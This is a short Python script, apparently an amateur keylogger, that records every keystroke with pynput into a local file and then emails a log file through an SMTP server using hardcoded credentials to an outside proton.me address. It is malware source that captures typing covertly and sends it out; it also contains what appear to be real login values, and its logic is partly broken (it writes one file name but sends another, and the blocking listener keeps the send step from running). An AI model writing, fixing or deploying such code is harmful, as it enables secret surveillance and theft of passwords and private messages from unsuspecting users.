# Importing the pynput library
from pynput.keyboard import Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Defining a function to log the keystrokes
def log_keystroke(key):
    # Converting the key object to a string
    key = str(key).replace("'", "")

    # Writing the keystroke to a file
    with open("log.txt", "a") as f:
        f.write(key)

# Creating a listener object to monitor the keyboard
with Listener(on_press=log_keystroke) as l:
    l.join()



log_file = "keylog.txt"
sender_email = "1bcd3a3f96faf2"
sender_password = "8e286f0c55520a"
receiver_email = "modestofernandez68@proton.me"
smtp_server = "sandbox.smtp.mailtrap.io"
smtp_port = 2525


def send_email(file_path):
    message = MIMEMultipart()
    message["Subject"] = "Keylogger log file"
    message["From"] = sender_email
    message["To"] = receiver_email

    with open(file_path, "r") as f:
        attachment = MIMEText(f.read())
        attachment.add_header("Content-Disposition", "attachment", filename=file_path)
        message.attach(attachment)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        print('te amo')
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print('funciona pls')

send_email(log_file)


